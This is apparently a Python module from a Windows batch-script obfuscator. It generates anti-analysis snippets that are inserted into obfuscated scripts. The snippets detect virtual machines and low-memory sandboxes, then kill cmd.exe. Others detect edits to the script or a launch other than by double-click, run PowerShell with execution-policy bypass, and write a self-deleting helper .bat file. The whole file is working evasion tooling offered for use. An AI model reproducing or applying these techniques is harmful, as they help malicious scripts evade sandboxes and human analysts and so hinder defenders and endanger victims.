import random


from util.methods.common.common import make_random_string
from util.supporting.settings import Settings

checked = False


class AntiChanges:
    @staticmethod
    def first_line_echo_check() -> str:
        """
        This function checks to see 2 things.
        1.) Is the user running with double click
        2.) Do echo commands exist in the file.

        If either of these are true it will exit the file.
        """
        random_bat_name = make_random_string((5, 6), False)
        if Settings.debug:
            return "\n"
        command = (
            f"""echo @echo off >> kdot{random_bat_name}.bat && echo findstr /i "echo" "%~f0" >> kdot{random_bat_name}.bat && echo if %%errorlevel%% == 0 ( taskkill /f /im cmd.exe ) else ( (goto) ^2^>^n^u^l ^& del "%%~f0" ) >> kdot{random_bat_name}.bat && call kdot{random_bat_name}.bat\n"""
            + "\n"
        )

        return command

    @staticmethod
    def byte_check() -> str:
        choices = [
            """powershell -NoLogo -NoProfile -ExecutionPolicy Bypass -Command \"$bytes = [System.IO.File]::ReadAllBytes('%~f0') ; if (($bytes[0] -ne 0xFF) -or ($bytes[1] -ne 0xFE)) { Write-Host 'The first 3 bytes of the file are not FF FE 0A.' ; taskkill /F /IM cmd.exe }\"""",
        ]

        choice = random.choice(choices)
        return choice

    @staticmethod
    def double_click_check() -> str:
        choices = [
            """echo %cmdcmdline% | find /i "%~f0">nul || exit /b 1\n""",
        ]

        return random.choice(choices)

    @staticmethod
    def vm_test():
        codes = [
            r"""for /f "tokens=2 delims==" %%a in ('wmic computersystem get manufacturer /value') do set manufacturer=%%a\nfor /f "tokens=2 delims==" %%a in ('wmic computersystem get model /value') do set model=%%a\nif "%manufacturer%"=="Microsoft Corporation" if "%model%"=="Virtual Machine" exit\nif "%manufacturer%"=="VMware, Inc." exit\nif "%model%"=="VirtualBox" exit""",
            # r"""for /f "tokens=2 delims=:" %%a in ('systeminfo ^| find "Total Physical Memory"') do ( set available_memory=%%a ) & set available_memory=%available_memory: =% & set available_memory=%available_memory:M=% & set available_memory=%available_memory:B=% & set /a available_memory=%available_memory% / 1024 / 1024 & if not %available_memory% gtr 4 ( exit /b 1 )""",
            # I love batch so much I gave up and used powershell
            # Now that I think about it it would have been a LOT more logical to use encoded command since its all base64
            """powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "if ((Get-WmiObject Win32_ComputerSystem).Model -match 'Virtual') { taskkill /F /IM cmd.exe }\"""",
            """powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "if((gcim Win32_PhysicalMemory | measure -Property capacity -Sum).sum /1gb -lt 8) {spps -f -n "cmd" -ErrorAction SilentlyContinue;exit 1}\"""",
        ]
        # ill add more one day
        ran_choice = random.choice(codes)
        return ran_choice
        # return codes[0]

    @staticmethod
    def anti_wifi() -> str:
        if Settings.require_wifi:
            # Ping request could not find host www.google.com. Please check the name and try again.
            return 'ping -n 1 -w 700 www.google.com | find "Pinging" > nul || exit'
        return ""

    @staticmethod
    def tests():
        choices = [
            AntiChanges.vm_test,
            AntiChanges.first_line_echo_check,
        ]

        if Settings.require_wifi:
            choices.append(AntiChanges.anti_wifi)
        if Settings.utf_16_bom and not Settings.debug:
            choices.append(AntiChanges.byte_check)
        if Settings.double_click_check and not Settings.debug:
            choices.append(AntiChanges.double_click_check)

        # return the name of the function used too
        choice = random.choice(choices)
        output = choice()
        return (output, choice.__name__)

    @staticmethod
    def anti_edit():
        pass
